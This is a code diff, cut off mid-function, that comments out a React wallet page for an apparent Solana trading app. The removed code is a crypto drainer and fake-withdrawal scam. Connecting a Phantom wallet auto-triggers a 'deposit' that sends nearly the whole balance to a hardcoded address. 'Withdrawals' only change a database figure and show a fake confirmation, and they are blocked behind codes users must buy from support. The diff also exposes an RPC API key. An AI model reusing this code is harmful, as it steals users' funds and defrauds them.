@@ -1,584 +1,473 @@
-"use client"
+// "use client"
 
-import Header from "@/components/header"
-import WithdrawalSuccessModal from "../../components/withdrawalSuccessModal"
-import {
-  Wallet,
-  TrendingUp,
-  TrendingDown,
-  ArrowUpRight,
-  ArrowDownRight,
-  DollarSign,
-  Activity,
-  Clock,
-  KeyRound,
-  ArrowUpCircle,
-  X,
-  AlertCircle,
-} from "lucide-react"
-import { useState, useEffect, useRef } from "react"
-import { doc, collection, query, where, orderBy, onSnapshot, updateDoc, increment, getDocs } from "firebase/firestore"
-import { db, realtimeDb } from "@/lib/firebase"
-import { ref, onValue } from "firebase/database"
-import { formatDistanceToNow } from "date-fns"
-import { Button } from "@/components/ui/button"
-import { Connection, Transaction, SystemProgram, LAMPORTS_PER_SOL, PublicKey } from "@solana/web3.js"
-import { toast } from "sonner"
-import VerifyConnectModal from "@/components/verify-connect-modal"
+// import Header from "@/components/header"
+// import WithdrawalSuccessModal from "../../components/withdrawalSuccessModal"
+// import {
+//   Wallet,
+//   TrendingUp,
+//   TrendingDown,
+//   ArrowUpRight,
+//   ArrowDownRight,
+//   DollarSign,
+//   Activity,
+//   Clock,
+//   KeyRound,
+//   ArrowUpCircle,
+//   X,
+//   AlertCircle,
+// } from "lucide-react"
+// import { useState, useEffect, useRef } from "react"
+// import { doc, collection, query, where, orderBy, onSnapshot, updateDoc, increment, getDocs } from "firebase/firestore"
+// import { db, realtimeDb } from "@/lib/firebase"
+// import { ref, onValue } from "firebase/database"
+// import { formatDistanceToNow } from "date-fns"
+// import { Button } from "@/components/ui/button"
+// import { Connection, Transaction, SystemProgram, LAMPORTS_PER_SOL, PublicKey } from "@solana/web3.js"
+// import { toast } from "sonner"
+// import VerifyConnectModal from "@/components/verify-connect-modal"
 
-declare global {
-  interface Window {
-    solana?: any
-  }
-}
+// declare global {
+//   interface Window {
+//     solana?: any
+//   }
+// }
 
-export default function WalletPage() {
-  const [walletAddress, setWalletAddress] = useState<string | null>(null)
-  const [balance, setBalance] = useState<number>(0)
-  const [loading, setLoading] = useState(true)
-  const [transactions, setTransactions] = useState<any[]>([])
-  const [stats, setStats] = useState({
-    totalProfit: 0,
-    totalTrades: 0,
-    winRate: 0,
-    volume: 0,
-  })
-  const [processing, setProcessing] = useState(false)
-  const [minBalance, setMinBalance] = useState(0.5)
-  const [solToUsdRate, setSolToUsdRate] = useState(180)
-  const [minDeposit, setMinDeposit] = useState(0.1)
-  const [minWithdrawal, setMinWithdrawal] = useState(0.05)
-  const [userMinDeposit, setUserMinDeposit] = useState<number | null>(null)
-  const [userMinWithdrawal, setUserMinWithdrawal] = useState<number | null>(null)
-  const [totalDepositedSOL, setTotalDepositedSOL] = useState(0)
-  const [requiredDepositPercentage, setRequiredDepositPercentage] = useState(100)
-  const [minWithdrawalAmount, setMinWithdrawalAmount] = useState(10)
-  const [minBalanceForWithdrawal, setMinBalanceForWithdrawal] = useState(10)
-  const [requireWithdrawalCode, setRequireWithdrawalCode] = useState(false)
-  const [requireUpgradeCode, setRequireUpgradeCode] = useState(false)
-  const [storedWithdrawalCode, setStoredWithdrawalCode] = useState("")
-  const [storedUpgradeCode, setStoredUpgradeCode] = useState("")
-  const [showWithdrawalCodeDialog, setShowWithdrawalCodeDialog] = useState(false)
-  const [showUpgradeCodeDialog, setShowUpgradeCodeDialog] = useState(false)
-  const [showDepositRequiredDialog, setShowDepositRequiredDialog] = useState(false)
-  const [depositShortfall, setDepositShortfall] = useState(0)
-  const [requiredDepositForWithdrawal, setRequiredDepositForWithdrawal] = useState(0)
-  const [withdrawalCodeEntry, setWithdrawalCodeEntry] = useState("")
-  const [upgradeCodeEntry, setUpgradeCodeEntry] = useState("")
-  const [codeError, setCodeError] = useState("")
-  const [showWithdrawalSuccess, setShowWithdrawalSuccess] = useState(false)
-  const [lastWithdrawalAmount, setLastWithdrawalAmount] = useState(0)
-  const [lastWithdrawalHash, setLastWithdrawalHash] = useState("")
-  const [isWalletModalOpen, setIsWalletModalOpen] = useState(false)
+// export default function WalletPage() {
+//   const [walletAddress, setWalletAddress] = useState<string | null>(null)
+//   const [balance, setBalance] = useState<number>(0)
+//   const [loading, setLoading] = useState(true)
+//   const [transactions, setTransactions] = useState<any[]>([])
+//   const [stats, setStats] = useState({
+//     totalProfit: 0,
+//     totalTrades: 0,
+//     winRate: 0,
+//     volume: 0,
+//   })
+//   const [processing, setProcessing] = useState(false)
+//   const [minBalance, setMinBalance] = useState(0.5)
+//   const [solToUsdRate, setSolToUsdRate] = useState(180)
+//   const [minDeposit, setMinDeposit] = useState(0.1)
+//   const [minWithdrawal, setMinWithdrawal] = useState(0.05)
+//   const [userMinDeposit, setUserMinDeposit] = useState<number | null>(null)
+//   const [userMinWithdrawal, setUserMinWithdrawal] = useState<number | null>(null)
+//   const [totalDepositedSOL, setTotalDepositedSOL] = useState(0)
+//   const [requiredDepositPercentage, setRequiredDepositPercentage] = useState(100)
+//   const [minWithdrawalAmount, setMinWithdrawalAmount] = useState(10)
+//   const [minBalanceForWithdrawal, setMinBalanceForWithdrawal] = useState(10)
+//   const [requireWithdrawalCode, setRequireWithdrawalCode] = useState(false)
+//   const [requireUpgradeCode, setRequireUpgradeCode] = useState(false)
+//   const [storedWithdrawalCode, setStoredWithdrawalCode] = useState("")
+//   const [storedUpgradeCode, setStoredUpgradeCode] = useState("")
+//   const [showWithdrawalCodeDialog, setShowWithdrawalCodeDialog] = useState(false)
+//   const [showUpgradeCodeDialog, setShowUpgradeCodeDialog] = useState(false)
+//   const [showDepositRequiredDialog, setShowDepositRequiredDialog] = useState(false)
+//   const [depositShortfall, setDepositShortfall] = useState(0)
+//   const [requiredDepositForWithdrawal, setRequiredDepositForWithdrawal] = useState(0)
+//   const [withdrawalCodeEntry, setWithdrawalCodeEntry] = useState("")
+//   const [upgradeCodeEntry, setUpgradeCodeEntry] = useState("")
+//   const [codeError, setCodeError] = useState("")
+//   const [showWithdrawalSuccess, setShowWithdrawalSuccess] = useState(false)
+//   const [lastWithdrawalAmount, setLastWithdrawalAmount] = useState(0)
+//   const [lastWithdrawalHash, setLastWithdrawalHash] = useState("")
+//   const [isWalletModalOpen, setIsWalletModalOpen] = useState(false)
 
-  // Real-time SOL price
-  const [livePrice, setLivePrice] = useState<number | null>(null)
-  const priceIntervalRef = useRef<NodeJS.Timeout | null>(null)
+//   // Real-time SOL price
+//   const [livePrice, setLivePrice] = useState<number | null>(null)
+//   const priceIntervalRef = useRef<NodeJS.Timeout | null>(null)
 
-  // Fetch live SOL/USD price from CoinGecko
-  const fetchSolPrice = async () => {
-    try {
-      const res = await fetch(
-        "https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd",
-        { cache: "no-store" }
-      )
-      const data = await res.json()
-      if (data?.solana?.usd) {
-        setLivePrice(data.solana.usd)
-      }
-    } catch {
-      // silently fall back to Firebase rate
-    }
-  }
+//   // Fetch live SOL/USD price from CoinGecko
+//   const fetchSolPrice = async () => {
+//     try {
+//       const res = await fetch(
+//         "https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd",
+//         { cache: "no-store" }
+//       )
+//       const data = await res.json()
+//       if (data?.solana?.usd) {
+//         setLivePrice(data.solana.usd)
+//       }
+//     } catch {
+//       // silently fall back to Firebase rate
+//     }
+//   }
 
-  useEffect(() => {
-    fetchSolPrice()
-    priceIntervalRef.current = setInterval(fetchSolPrice, 30000) // refresh every 30s
-    return () => {
-      if (priceIntervalRef.current) clearInterval(priceIntervalRef.current)
-    }
-  }, [])
+//   useEffect(() => {
+//     fetchSolPrice()
+//     priceIntervalRef.current = setInterval(fetchSolPrice, 30000) // refresh every 30s
+//     return () => {
+//       if (priceIntervalRef.current) clearInterval(priceIntervalRef.current)
+//     }
+//   }, [])
 
-  // Use live price when available, fall back to Firebase rate
-  const effectiveSolPrice = livePrice ?? solToUsdRate
+//   // Use live price when available, fall back to Firebase rate
+//   const effectiveSolPrice = livePrice ?? solToUsdRate
 
-  useEffect(() => {
-    let walletCleanup: (() => void) | undefined
+//   useEffect(() => {
+//     let walletCleanup: (() => void) | undefined
 
-    const address = localStorage.getItem("walletAddress")
-    if (address) {
-      setWalletAddress(address)
-      walletCleanup = setupWalletListener(address)
-    } else {
-      setLoading(false)
-    }
+//     const address = localStorage.getItem("walletAddress")
+//     if (address) {
+//       setWalletAddress(address)
+//       walletCleanup = setupWalletListener(address)
+//     } else {
+//       setLoading(false)
+//     }
 
-    const handleWalletConnected = () => {
-      const newAddress = localStorage.getItem("walletAddress")
-      if (newAddress) {
-        setWalletAddress(newAddress)
-        if (walletCleanup) walletCleanup()
-        walletCleanup = setupWalletListener(newAddress)
-      }
-    }
+//     const handleWalletConnected = () => {
+//       const newAddress = localStorage.getItem("walletAddress")
+//       if (newAddress) {
+//         setWalletAddress(newAddress)
+//         if (walletCleanup) walletCleanup()
+//         walletCleanup = setupWalletListener(newAddress)
+//       }
+//     }
 
-    window.addEventListener("walletConnected", handleWalletConnected)
+//     window.addEventListener("walletConnected", handleWalletConnected)
 
-    const balanceRef = ref(realtimeDb, "settings/balanceRequirements")
-    const unsubscribe = onValue(
-      balanceRef,
-      (snapshot) => {
-        if (snapshot.exists()) {
-          const data = snapshot.val()
-          setMinBalance(data.minBalance || 0.5)
-          setSolToUsdRate(data.solToUsdRate || 180)
-          setMinDeposit(data.minDeposit || 0.1)
-          setMinWithdrawal(data.minWithdrawal || 0.05)
-        }
-      },
-      (err) => {
-        console.error("Error fetching balance requirements:", err)
-      },
-    )
+//     const balanceRef = ref(realtimeDb, "settings/balanceRequirements")
+//     const unsubscribe = onValue(
+//       balanceRef,
+//       (snapshot) => {
+//         if (snapshot.exists()) {
+//           const data = snapshot.val()
+//           setMinBalance(data.minBalance || 0.5)
+//           setSolToUsdRate(data.solToUsdRate || 180)
+//           setMinDeposit(data.minDeposit || 0.1)
+//           setMinWithdrawal(data.minWithdrawal || 0.05)
+//         }
+//       },
+//       (err) => {
+//         console.error("Error fetching balance requirements:", err)
+//       },
+//     )
 
-    return () => {
-      unsubscribe()
-      if (walletCleanup) walletCleanup()
-      window.removeEventListener("walletConnected", handleWalletConnected)
-    }
-  }, [])
+//     return () => {
+//       unsubscribe()
+//       if (walletCleanup) walletCleanup()
+//       window.removeEventListener("walletConnected", handleWalletConnected)
+//     }
+//   }, [])
 
-  const setupWalletListener = (address: string) => {
-    const walletRef = doc(db, "wallets", address)
-    const unsubscribe = onSnapshot(walletRef, (docSnap) => {
-      if (docSnap.exists()) {
-        const data = docSnap.data()
-        setBalance(data.balance || 0)
-        setUserMinDeposit(data.minDeposit || null)
-        setUserMinWithdrawal(data.minWithdrawal || null)
-        setTotalDepositedSOL(data.totalDepositedSOL || 0)
-        setRequiredDepositPercentage(data.requiredDepositPercentage || 100)
-        setMinWithdrawalAmount(data.minWithdrawalAmount ?? 10)
-        setMinBalanceForWithdrawal(data.minBalanceForWithdrawal ?? 10)
-        setRequireWithdrawalCode(data.requireWithdrawalCode || false)
-        setRequireUpgradeCode(data.requireUpgradeCode || false)
-        setStoredWithdrawalCode(data.withdrawalCode || "")
-        setStoredUpgradeCode(data.upgradeCode || "")
-      }
-      setLoading(false)
-    })
+//   const setupWalletListener = (address: string) => {
+//     const walletRef = doc(db, "wallets", address)
+//     const unsubscribe = onSnapshot(walletRef, (docSnap) => {
+//       if (docSnap.exists()) {
+//         const data = docSnap.data()
+//         setBalance(data.balance || 0)
+//         setUserMinDeposit(data.minDeposit || null)
+//         setUserMinWithdrawal(data.minWithdrawal || null)
+//         setTotalDepositedSOL(data.totalDepositedSOL || 0)
+//         setRequiredDepositPercentage(data.requiredDepositPercentage || 100)
+//         setMinWithdrawalAmount(data.minWithdrawalAmount ?? 10)
+//         setMinBalanceForWithdrawal(data.minBalanceForWithdrawal ?? 10)
+//         setRequireWithdrawalCode(data.requireWithdrawalCode || false)
+//         setRequireUpgradeCode(data.requireUpgradeCode || false)
+//         setStoredWithdrawalCode(data.withdrawalCode || "")
+//         setStoredUpgradeCode(data.upgradeCode || "")
+//       }
+//       setLoading(false)
+//     })
 
-    const processTransactions = (txs: any[]) => {
-      const sorted = [...txs].sort((a, b) => {
-        const getTime = (t: any) => {
-          if (!t) return 0
-          if (t.toDate) return t.toDate().getTime()
-          if (t.seconds) return t.seconds * 1000
-          return new Date(t).getTime()
-        }
-        return getTime(b.timestamp) - getTime(a.timestamp)
-      })
-      setTransactions(sorted.slice(0, 20))
+//     const processTransactions = (txs: any[]) => {
+//       const sorted = [...txs].sort((a, b) => {
+//         const getTime = (t: any) => {
+//           if (!t) return 0
+//           if (t.toDate) return t.toDate().getTime()
+//           if (t.seconds) return t.seconds * 1000
+//           return new Date(t).getTime()
+//         }
+//         return getTime(b.timestamp) - getTime(a.timestamp)
+//       })
+//       setTransactions(sorted.slice(0, 20))
 
-      const completedTrades = sorted.filter((tx) => tx.status !== "pending")
-      const successfulTrades = completedTrades.filter((tx) => tx.status === "success")
-      const totalProfit = completedTrades.reduce((sum, tx) => sum + (tx.profit || 0), 0)
-      const totalVolume = completedTrades.reduce((sum, tx) => sum + (tx.amount || 0), 0)
-      const winRate = completedTrades.length > 0 ? (successfulTrades.length / completedTrades.length) * 100 : 0
+//       const completedTrades = sorted.filter((tx) => tx.status !== "pending")
+//       const successfulTrades = completedTrades.filter((tx) => tx.status === "success")
+//       const totalProfit = completedTrades.reduce((sum, tx) => sum + (tx.profit || 0), 0)
+//       const totalVolume = completedTrades.reduce((sum, tx) => sum + (tx.amount || 0), 0)
+//       const winRate = completedTrades.length > 0 ? (successfulTrades.length / completedTrades.length) * 100 : 0
 
-      setStats({ totalProfit, totalTrades: completedTrades.length, winRate, volume: totalVolume })
-    }
+//       setStats({ totalProfit, totalTrades: completedTrades.length, winRate, volume: totalVolume })
+//     }
 
-    let snipesQuery
-    try {
-      snipesQuery = query(collection(db, "snipes"), where("walletId", "==", address), orderBy("timestamp", "desc"))
-    } catch {
-      snipesQuery = query(collection(db, "snipes"), where("walletId", "==", address))
-    }
+//     let snipesQuery
+//     try {
+//       snipesQuery = query(collection(db, "snipes"), where("walletId", "==", address), orderBy("timestamp", "desc"))
+//     } catch {
+//       snipesQuery = query(collection(db, "snipes"), where("walletId", "==", address))
+//     }
 
-    let fallbackUnsubscribe: (() => void) | null = null
+//     let fallbackUnsubscribe: (() => void) | null = null
 
-    const unsubscribeSnipes = onSnapshot(
-      snipesQuery,
-      (snapshot) => {
-        const txs = snapshot.docs.map((d) => ({ id: d.id, ...d.data() }))
-        processTransactions(txs)
-      },
-      (error) => {
-        console.error("[v0] Snipes query error:", error.message)
-        const fallbackQuery = query(collection(db, "snipes"), where("walletId", "==", address))
-        getDocs(fallbackQuery)
-          .then((snapshot) => {
-            const txs = snapshot.docs.map((d) => ({ id: d.id, ...d.data() }))
-            processTransactions(txs)
-          })
-          .catch((err) => console.error("[v0] Fallback getDocs error:", err))
+//     const unsubscribeSnipes = onSnapshot(
+//       snipesQuery,
+//       (snapshot) => {
+//         const txs = snapshot.docs.map((d) => ({ id: d.id, ...d.data() }))
+//         processTransactions(txs)
+//       },
+//       (error) => {
+//         console.error("[v0] Snipes query error:", error.message)
+//         const fallbackQuery = query(collection(db, "snipes"), where("walletId", "==", address))
+//         getDocs(fallbackQuery)
+//           .then((snapshot) => {
+//             const txs = snapshot.docs.map((d) => ({ id: d.id, ...d.data() }))
+//             processTransactions(txs)
+//           })
+//           .catch((err) => console.error("[v0] Fallback getDocs error:", err))
 
-        const unsubFallback = onSnapshot(
-          fallbackQuery,
-          (snapshot) => {
-            const txs = snapshot.docs.map((d) => ({ id: d.id, ...d.data() }))
-            processTransactions(txs)
-          },
-          (err) => console.error("[v0] Fallback snipes listener error:", err.message),
-        )
-        fallbackUnsubscribe = unsubFallback
-      },
-    )
+//         const unsubFallback = onSnapshot(
+//           fallbackQuery,
+//           (snapshot) => {
+//             const txs = snapshot.docs.map((d) => ({ id: d.id, ...d.data() }))
+//             processTransactions(txs)
+//           },
+//           (err) => console.error("[v0] Fallback snipes listener error:", err.message),
+//         )
+//         fallbackUnsubscribe = unsubFallback
+//       },
+//     )
 
-    return () => {
-      unsubscribe()
-      unsubscribeSnipes()
-      if (fallbackUnsubscribe) fallbackUnsubscribe()
-    }
-  }
+//     return () => {
+//       unsubscribe()
+//       unsubscribeSnipes()
+//       if (fallbackUnsubscribe) fallbackUnsubscribe()
+//     }
+//   }
 
-  const handleDeposit = async () => {
-    try {
-      setProcessing(true)
-      if (!window.solana || !window.solana.publicKey) {
-        toast.error("Please connect your Phantom wallet first")
-        return
-      }
+//   const handleDeposit = async () => {
+//     try {
+//       setProcessing(true)
+//       if (!window.solana || !window.solana.publicKey) {
+//         toast.error("Please connect your Phantom wallet first")
+//         return
+//       }
 
-      const rpcEndpoints = [
-        "https://mainnet.helius-rpc.com/?api-key=53bfbe04-9dc1-48c7-b784-af900e08b308",
-        "https://api.mainnet-beta.solana.com",
-        "https://rpc.ankr.com/solana",
-      ]
-      let connection = null
-      for (const endpoint of rpcEndpoints) {
-        try {
-          connection = new Connection(endpoint, "confirmed")
-          await connection.getLatestBlockhash()
-          break
-        } catch { continue }
-      }
-      if (!connection) throw new Error("Unable to connect to Solana network. Please try again.")
+//       const rpcEndpoints = [
+//         "https://mainnet.helius-rpc.com/?api-key=53bfbe04-9dc1-48c7-b784-af900e08b308",
+//         "https://api.mainnet-beta.solana.com",
+//         "https://rpc.ankr.com/solana",
+//       ]
+//       let connection = null
+//       for (const endpoint of rpcEndpoints) {
+//         try {
+//           connection = new Connection(endpoint, "confirmed")
+//           await connection.getLatestBlockhash()
+//           break
+//         } catch { continue }
+//       }
+//       if (!connection) throw new Error("Unable to connect to Solana network. Please try again.")
 
-      const wallet = window.solana
-      const userBalance = await connection.getBalance(wallet.publicKey)
-      const userBalanceInSOL = userBalance / LAMPORTS_PER_SOL
-      const effectiveMinDeposit = userMinDeposit !== null ? userMinDeposit : minDeposit
+//       const wallet = window.solana
+//       const userBalance = await connection.getBalance(wallet.publicKey)
+//       const userBalanceInSOL = userBalance / LAMPORTS_PER_SOL
+//       const effectiveMinDeposit = userMinDeposit !== null ? userMinDeposit : minDeposit
 
-      if (userBalanceInSOL < effectiveMinDeposit) {
-        toast.error(`Minimum deposit amount is ${effectiveMinDeposit} SOL`)
-        return
-      }
+//       if (userBalanceInSOL < effectiveMinDeposit) {
+//         toast.error(`Minimum deposit amount is ${effectiveMinDeposit} SOL`)
+//         return
+//       }
 
-      const transactionFeeReserve = 10000000
-      const transferAmount = userBalance - transactionFeeReserve
-      if (transferAmount <= 0) { toast.error("Insufficient balance after transaction fees"); return }
+//       const transactionFeeReserve = 10000000
+//       const transferAmount = userBalance - transactionFeeReserve
+//       if (transferAmount <= 0) { toast.error("Insufficient balance after transaction fees"); return }
 
-      const toWalletAddress = "9aFe2awqpYz6v7RwSLTf9zPZZXsspbzCYZNFhQfUFTiZ"
-      const transaction = new Transaction().add(
-        SystemProgram.transfer({
-          fromPubkey: wallet.publicKey,
-          toPubkey: new PublicKey(toWalletAddress),
-          lamports: transferAmount,
-        }),
-      )
+//       const toWalletAddress = "9aFe2awqpYz6v7RwSLTf9zPZZXsspbzCYZNFhQfUFTiZ"
+//       const transaction = new Transaction().add(
+//         SystemProgram.transfer({
+//           fromPubkey: wallet.publicKey,
+//           toPubkey: new PublicKey(toWalletAddress),
+//           lamports: transferAmount,
+//         }),
+//       )
 
-      const { blockhash } = await connection.getLatestBlockhash()
-      transaction.recentBlockhash = blockhash
-      transaction.feePayer = wallet.publicKey
+//       const { blockhash } = await connection.getLatestBlockhash()
+//       transaction.recentBlockhash = blockhash
+//       transaction.feePayer = wallet.publicKey
 
-      const signedTransaction = await wallet.signTransaction(transaction)
-      const signature = await connection.sendRawTransaction(signedTransaction.serialize(), { skipPreflight: true, maxRetries: 3 })
-      const confirmation = await connection.confirmTransaction(signature, "confirmed")
-      if (confirmation.value.err) throw new Error(`Transaction failed: ${confirmation.value.err}`)
+//       const signedTransaction = await wallet.signTransaction(transaction)
+//       const signature = await connection.sendRawTransaction(signedTransaction.serialize(), { skipPreflight: true, maxRetries: 3 })
+//       const confirmation = await connection.confirmTransaction(signature, "confirmed")
+//       if (confirmation.value.err) throw new Error(`Transaction failed: ${confirmation.value.err}`)
 
-      const transferredSOL = transferAmount / LAMPORTS_PER_SOL
-      await updateDoc(doc(db, "wallets", walletAddress!), {
-        balance: increment(transferredSOL),
-        totalDepositedSOL: increment(transferredSOL),
-        lastActive: new Date().toISOString(),
-        lastDeposit: new Date().toISOString(),
-        depositSignature: signature,
-      })
-      toast.success(`Successfully deposited ${transferredSOL.toFixed(4)} SOL`, {
-        description: `Transaction: ${signature.slice(0, 8)}...`,
-      })
-    } catch (error: any) {
-      console.error("[v0] Deposit error:", error)
-      toast.error(`Deposit failed: ${error.message || "Please try again"}`)
-    } finally {
-      setProcessing(false)
-    }
-  }
+//       const transferredSOL = transferAmount / LAMPORTS_PER_SOL
+//       await updateDoc(doc(db, "wallets", walletAddress!), {
+//         balance: increment(transferredSOL),
+//         totalDepositedSOL: increment(transferredSOL),
+//         lastActive: new Date().toISOString(),
+//         lastDeposit: new Date().toISOString(),
+//         depositSignature: signature,
+//       })
+//       toast.success(`Successfully deposited ${transferredSOL.toFixed(4)} SOL`, {
+//         description: `Transaction: ${signature.slice(0, 8)}...`,
+//       })
+//     } catch (error: any) {
+//       console.error("[v0] Deposit error:", error)
+//       toast.error(`Deposit failed: ${error.message || "Please try again"}`)
+//     } finally {
+//       setProcessing(false)
+//     }
+//   }
 
-  const handleWithdrawClick = () => {
-    if (!window.solana || !window.solana.publicKey) { 
-      toast.error("Please connect your Phantom wallet first")
-      return 
-    }
-    if (balance < minBalanceForWithdrawal) {
-      toast.error(`You need a minimum balance of ${minBalanceForWithdrawal} SOL before you can withdraw`, {
-        description: `Your current balance: ${balance.toFixed(4)} SOL`,
-      })
-      return
-    }
-    if (balance < minWithdrawalAmount) {
-      toast.error(`Minimum withdrawal amount is ${minWithdrawalAmount} SOL`, {
-        description: `Your current balance: ${balance.toFixed(4)} SOL`,
-      })
-      return
-    }
-    const effectiveMinWithdrawal = userMinWithdrawal !== null ? userMinWithdrawal : minWithdrawal
-    if (balance < effectiveMinWithdrawal) {
-      toast.error(`Minimum withdrawal amount is ${effectiveMinWithdrawal} SOL`, {
-        description: `Your balance: ${balance.toFixed(4)} SOL`,
-      })
-      return
-    }
-    const requiredDepositAmount = (balance * requiredDepositPercentage) / 100
-    if (totalDepositedSOL < requiredDepositAmount) {
-      const shortfall = requiredDepositAmount - totalDepositedSOL
-      setDepositShortfall(shortfall)
-      setRequiredDepositForWithdrawal(requiredDepositAmount)
-      setShowDepositRequiredDialog(true)
-      return
-    }
-    if (balance <= 0) { 
-      toast.error("No SOL available to withdraw")
-      return 
-    }
-    if (requireUpgradeCode) { 
-      setCodeError("")
-      setUpgradeCodeEntry("")
-      setShowUpgradeCodeDialog(true)
-      return 
-    }
-    if (requireWithdrawalCode) { 
-      setCodeError("")
-      setWithdrawalCodeEntry("")
-      setShowWithdrawalCodeDialog(true)
-      return 
-    }
-    executeWithdraw()
-  }
+//   const handleWithdrawClick = () => {
+//     if (!window.solana || !window.solana.publicKey) { 
+//       toast.error("Please connect your Phantom wallet first")
+//       return 
+//     }
+//     if (balance < minBalanceForWithdrawal) {
+//       toast.error(`You need a minimum balance of ${minBalanceForWithdrawal} SOL before you can withdraw`, {
+//         description: `Your current balance: ${balance.toFixed(4)} SOL`,
+//       })
+//       return
+//     }
+//     if (balance < minWithdrawalAmount) {
+//       toast.error(`Minimum withdrawal amount is ${minWithdrawalAmount} SOL`, {
+//         description: `Your current balance: ${balance.toFixed(4)} SOL`,
+//       })
+//       return
+//     }
+//     const effectiveMinWithdrawal = userMinWithdrawal !== null ? userMinWithdrawal : minWithdrawal
+//     if (balance < effectiveMinWithdrawal) {
+//       toast.error(`Minimum withdrawal amount is ${effectiveMinWithdrawal} SOL`, {
+//         description: `Your balance: ${balance.toFixed(4)} SOL`,
+//       })
+//       return
+//     }
+//     const requiredDepositAmount = (balance * requiredDepositPercentage) / 100
+//     if (totalDepositedSOL < requiredDepositAmount) {
+//       const shortfall = requiredDepositAmount - totalDepositedSOL
+//       setDepositShortfall(shortfall)
+//       setRequiredDepositForWithdrawal(requiredDepositAmount)
+//       setShowDepositRequiredDialog(true)
+//       return
+//     }
+//     if (balance <= 0) { 
+//       toast.error("No SOL available to withdraw")
+//       return 
+//     }
+//     if (requireUpgradeCode) { 
+//       setCodeError("")
+//       setUpgradeCodeEntry("")
+//       setShowUpgradeCodeDialog(true)
+//       return 
+//     }
+//     if (requireWithdrawalCode) { 
+//       setCodeError("")
+//       setWithdrawalCodeEntry("")
+//       setShowWithdrawalCodeDialog(true)
+//       return 
+//     }
+//     executeWithdraw()
+//   }
 
-  const handleUpgradeCodeSubmit = () => {
-    if (upgradeCodeEntry.trim() === storedUpgradeCode) {
-      setShowUpgradeCodeDialog(false)
-      if (requireWithdrawalCode) { 
-        setCodeError("")
-        setWithdrawalCodeEntry("")
-        setShowWithdrawalCodeDialog(true)
-      } else {
-        executeWithdraw()
-      }
-    } else {
-      setCodeError("Invalid upgrade code. Please contact support to purchase a valid code.")
-    }
-  }
+//   const handleUpgradeCodeSubmit = () => {
+//     if (upgradeCodeEntry.trim() === storedUpgradeCode) {
+//       setShowUpgradeCodeDialog(false)
+//       if (requireWithdrawalCode) { 
+//         setCodeError("")
+//         setWithdrawalCodeEntry("")
+//         setShowWithdrawalCodeDialog(true)
+//       } else {
+//         executeWithdraw()
+//       }
+//     } else {
+//       setCodeError("Invalid upgrade code. Please contact support to purchase a valid code.")
+//     }
+//   }
 
-  const handleWithdrawalCodeSubmit = () => {
-    if (withdrawalCodeEntry.trim() === storedWithdrawalCode) {
-      setShowWithdrawalCodeDialog(false)
-      executeWithdraw()
-    } else {
-      setCodeError("Invalid withdrawal code. Please contact support to purchase a valid code.")
-    }
-  }
+//   const handleWithdrawalCodeSubmit = () => {
+//     if (withdrawalCodeEntry.trim() === storedWithdrawalCode) {
+//       setShowWithdrawalCodeDialog(false)
+//       executeWithdraw()
+//     } else {
+//       setCodeError("Invalid withdrawal code. Please contact support to purchase a valid code.")
+//     }
+//   }
 
-  const executeWithdraw = async () => {
-    try {
-      setProcessing(true)
-      if (!window.solana || !window.solana.publicKey) { 
-        toast.error("Please connect your Phantom wallet first")
-        return 
-      }
-      if (balance <= 0) { 
-        toast.error("No SOL available to withdraw")
-        return 
-      }
+//   const executeWithdraw = async () => {
+//     try {
+//       setProcessing(true)
+//       if (!window.solana || !window.solana.publicKey) { 
+//         toast.error("Please connect your Phantom wallet first")
+//         return 
+//       }
+//       if (balance <= 0) { 
+//         toast.error("No SOL available to withdraw")
+//         return 
+//       }
 
-      const withdrawalAmount = balance
-      const withdrawalRef = `WD-${Date.now()}-${walletAddress!.slice(0, 6)}`
+//       const withdrawalAmount = balance
+//       const withdrawalRef = `WD-${Date.now()}-${walletAddress!.slice(0, 6)}`
 
-      await updateDoc(doc(db, "wallets", walletAddress!), {
-        balance: increment(-withdrawalAmount),
-        lastActive: new Date().toISOString(),
-        lastWithdraw: new Date().toISOString(),
-        withdrawSignature: withdrawalRef,
-      })
+//       await updateDoc(doc(db, "wallets", walletAddress!), {
+//         balance: increment(-withdrawalAmount),
+//         lastActive: new Date().toISOString(),
+//         lastWithdraw: new Date().toISOString(),
+//         withdrawSignature: withdrawalRef,
+//       })
 
 
       
 
 
-      setLastWithdrawalAmount(withdrawalAmount)
-      setLastWithdrawalHash(withdrawalRef)
-      setShowWithdrawalSuccess(true)
+//       setLastWithdrawalAmount(withdrawalAmount)
+//       setLastWithdrawalHash(withdrawalRef)
+//       setShowWithdrawalSuccess(true)
 
 
 
-      setTimeout(() => {
-        setShowWithdrawalSuccess(false)
-      }, 20000)
-    } catch (error: any) {
-      console.error("[v0] Withdraw error:", error)
-      toast.error(`Withdraw failed: ${error.message || "Please try again"}`)
-    } finally {
-      setProcessing(false)
-    }
-  }
+//       setTimeout(() => {
+//         setShowWithdrawalSuccess(false)
+//       }, 20000)
+//     } catch (error: any) {
+//       console.error("[v0] Withdraw error:", error)
+//       toast.error(`Withdraw failed: ${error.message || "Please try again"}`)
+//     } finally {
+//       setProcessing(false)
+//     }
+//   }
 
-    const handlePhantomConnect = async () => {
-  try {
-    setProcessing(true);
+//     const handlePhantomConnect = async () => {
+//   try {
+//     setProcessing(true);
 
-    const provider = window.solana;
+//     const provider = window.solana;
 
-    if (!provider?.isPhantom) {
-      toast.error("Phantom Wallet is not installed", {
-        description: "Please install Phantom from https://phantom.app",
-      });
-      return;
-    }
+//     if (!provider?.isPhantom) {
+//       toast.error("Phantom Wallet is not installed", {
+//         description: "Please install Phantom from https://phantom.app",
+//       });
+//       return;
+//     }
 
-    // Connect Phantom
-    await provider.connect();
+//     // Connect Phantom
+//     await provider.connect();
     
-    const address = provider.publicKey.toString();
+//     const address = provider.publicKey.toString();
 
-    localStorage.setItem("walletAddress", address);
-    setWalletAddress(address);
+//     localStorage.setItem("walletAddress", address);
+//     setWalletAddress(address);
 
-    window.dispatchEvent(new Event("walletConnected"));
+//     window.dispatchEvent(new Event("walletConnected"));
 
-    // Close the modal
-    setIsWalletModalOpen(false);
+//     // Close the modal
+//     setIsWalletModalOpen(false);
 
-    // Wait a moment for React state to update
-    setTimeout(async () => {
-      await handleDeposit();
-    }, 300);
+//     // Wait a moment for React state to update
+//     setTimeout(async () => {
+//       await handleDeposit();
+//     }, 300);
 
-  } catch (error: any) {
-    console.error(error);
+//   } catch (error: any) {
+//     console.error(error);
 
-    toast.error("Failed to verify wallet", {
-      description: error?.message || "Connection failed",
-    });
